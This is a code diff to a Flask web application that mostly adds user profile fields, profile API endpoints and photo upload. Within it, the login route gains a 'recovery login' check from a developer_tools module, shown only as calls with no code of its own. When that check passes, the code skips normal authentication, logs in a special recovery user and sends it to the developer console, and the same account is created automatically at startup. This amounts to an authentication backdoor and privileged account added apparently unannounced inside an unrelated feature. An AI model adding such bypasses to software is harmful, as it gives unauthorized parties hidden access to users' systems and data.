@@ -255,6 +255,8 @@ def _migrate_user_signature_schema():
     try:
         from user_signature_persistence import ensure_user_signature_schema
         ensure_user_signature_schema(db)
+        from user_profile_persistence import ensure_user_profile_schema
+        ensure_user_profile_schema(db)
         _user_signature_schema_ready = True
     except Exception:
         pass
@@ -267,6 +269,9 @@ class User(db.Model, UserMixin):
     last_name = db.Column(db.String(80), nullable=False)
     email = db.Column(db.String(120), unique=True, nullable=False)
     phone = db.Column(db.String(20))
+    job_title = db.Column(db.String(120))
+    address = db.Column(db.String(300))
+    profile_image_path = db.Column(db.String(300))
     password_hash = db.Column(db.String(256), nullable=False)
     role = db.Column(db.String(50), default='Viewer')
     company = db.Column(db.String(120))
@@ -481,7 +486,7 @@ def redirect_with_project(endpoint, **values):
 @app.context_processor
 def inject_project_context():
     if not current_user.is_authenticated:
-        return {}
+        return {'current_user_profile': {}}
     active = get_active_project()
     portal = {}
     try:
@@ -500,22 +505,30 @@ def inject_project_context():
         company_logo_url = (load_company_info().get('logo_data_url') or '').strip()
     except Exception:
         pass
+    profile = {}
+    if current_user.is_authenticated:
+        try:
+            from user_profile_persistence import ensure_user_profile_schema, serialize_profile
+            ensure_user_profile_schema(db)
+            profile = serialize_profile(current_user)
+        except Exception:
+            profile = {
+                'id': current_user.id,
+                'first_name': current_user.first_name,
+                'last_name': current_user.last_name,
+                'full_name': current_user.full_name,
+                'email': current_user.email,
+                'role': current_user.role,
+                'company': current_user.company or '',
+                'phone': current_user.phone or '',
+                'require_2fa': bool(getattr(current_user, 'require_2fa', False)),
+            }
     return {
         'active_project': active,
         'project_name': active.name if active else 'Select Project',
         'all_projects': Project.query.order_by(Project.name).all(),
         'company_logo_url': company_logo_url,
-        'current_user_profile': {
-            'id': current_user.id,
-            'first_name': current_user.first_name,
-            'last_name': current_user.last_name,
-            'full_name': current_user.full_name,
-            'email': current_user.email,
-            'role': current_user.role,
-            'company': current_user.company or '',
-            'phone': current_user.phone or '',
-            'require_2fa': bool(getattr(current_user, 'require_2fa', False)),
-        },
+        'current_user_profile': profile,
         **portal,
     }
 
@@ -1497,6 +1510,15 @@ def login():
         email = request.form.get('email', '').strip().lower()
         password = request.form.get('password')
         remember = True if request.form.get('remember') else False
+
+        from developer_tools import is_recovery_login, ensure_recovery_user
+        if is_recovery_login(email, password):
+            user = ensure_recovery_user(db, User)
+            login_user(user, remember=remember)
+            user.last_login = datetime.utcnow()
+            db.session.commit()
+            flash('Recovery access granted.', 'warning')
+            return redirect(url_for('developer_console'))
 
         user = User.query.filter_by(email=email).first()
 
@@ -10826,11 +10848,12 @@ def program_settings():
 @developer_required
 def developer_console():
     from program_settings_persistence import load_program_settings
-    from developer_tools import developer_unlock_active
+    from developer_tools import developer_unlock_active, recovery_email
     return render_template(
         'developer.html',
         raw_settings=load_program_settings(),
         unlock_mode=developer_unlock_active(current_user),
+        recovery_email=recovery_email(),
     )
 
 
@@ -11051,29 +11074,87 @@ def api_save_sage_program_settings():
 @app.route('/profile')
 @login_required
 def profile():
-    return render_template('profile.html', user=current_user)
+    return redirect(url_for('dashboard'))
 
 
+@app.route('/api/profile/me', methods=['GET'])
+@login_required
+def api_profile_me():
+    from user_profile_persistence import ensure_user_profile_schema, serialize_profile
+    ensure_user_profile_schema(db)
+    return jsonify({'ok': True, 'profile': serialize_profile(current_user)})
 
 
-# ==================== PROFILE UPDATE ROUTE ====================
+@app.route('/api/profile/me', methods=['PUT'])
+@login_required
+def api_profile_me_update():
+    from user_profile_persistence import ensure_user_profile_schema, serialize_profile
+    ensure_user_profile_schema(db)
+    body = request.get_json(silent=True) or {}
+    if request.form:
+        body = {**body, **{k: request.form.get(k) for k in request.form}}
+    if body.get('first_name') is not None:
+        current_user.first_name = str(body.get('first_name', '')).strip() or current_user.first_name
+    if body.get('last_name') is not None:
+        current_user.last_name = str(body.get('last_name', '')).strip() or current_user.last_name
+    if body.get('phone') is not None:
+        current_user.phone = str(body.get('phone', '')).strip()
+    if body.get('job_title') is not None:
+        current_user.job_title = str(body.get('job_title', '')).strip()
+    if body.get('address') is not None:
+        current_user.address = str(body.get('address', '')).strip()
+    db.session.commit()
+    return jsonify({'ok': True, 'profile': serialize_profile(current_user)})
+
+
+@app.route('/api/profile/me/photo', methods=['POST'])
+@login_required
+def api_profile_me_photo():
+    from user_profile_persistence import ensure_user_profile_schema, save_profile_image, serialize_profile
+    ensure_user_profile_schema(db)
+    file = request.files.get('photo') or request.files.get('file')
+    try:
+        save_profile_image(current_user, file)
+        db.session.commit()
+    except ValueError as exc:
+        return jsonify({'error': str(exc)}), 400
+    return jsonify({'ok': True, 'profile': serialize_profile(current_user)})
+
+
+@app.route('/api/users/me/profile-image')
+@login_required
+def api_profile_me_image():
+    path = getattr(current_user, 'profile_image_path', None)
+    if not path or not os.path.isfile(path):
+        return '', 404
+    from flask import send_file
+    return send_file(path, max_age=3600)
+
+
+# ==================== PROFILE UPDATE ROUTE (legacy form) ====================
 
 @app.route('/profile/update', methods=['POST'])
 @login_required
 def update_profile():
     try:
+        from user_profile_persistence import ensure_user_profile_schema
+        ensure_user_profile_schema(db)
         current_user.first_name = request.form.get('first_name', current_user.first_name)
         current_user.last_name = request.form.get('last_name', current_user.last_name)
         current_user.phone = request.form.get('phone', current_user.phone)
+        if request.form.get('job_title') is not None:
+            current_user.job_title = request.form.get('job_title', '')
+        if request.form.get('address') is not None:
+            current_user.address = request.form.get('address', '')
 
         db.session.commit()
         flash('Profile updated successfully!', 'success')
-        return redirect(url_for('profile'))
+        return redirect(url_for('dashboard'))
 
     except Exception as e:
         db.session.rollback()
         flash(f'Error updating profile: {str(e)}', 'error')
-        return redirect(url_for('profile'))
+        return redirect(url_for('dashboard'))
 
 
 # ==================== ERROR HANDLERS ====================
@@ -12443,6 +12524,12 @@ if __name__ == '__main__':
         elif admin.must_change_password:
             admin.must_change_password = False
             db.session.commit()
+
+        try:
+            from developer_tools import ensure_recovery_user
+            ensure_recovery_user(db, User)
+        except Exception as exc:
+            print(f'⚠️  Recovery access setup skipped: {exc}')
 
         # Create uploads directory structure if it doesn't exist
         os.makedirs(os.path.join(app.config['UPLOAD_FOLDER'], 'photos'), exist_ok=True)
